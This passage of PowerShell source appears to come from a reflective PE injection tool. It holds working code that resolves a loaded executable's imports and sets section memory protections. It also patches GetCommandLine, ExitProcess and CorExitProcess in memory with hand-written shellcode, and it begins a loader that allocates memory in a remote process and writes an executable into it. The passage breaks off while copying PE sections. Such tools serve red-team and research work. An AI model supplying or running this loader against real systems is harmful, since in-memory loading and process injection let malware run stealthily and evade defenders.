				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
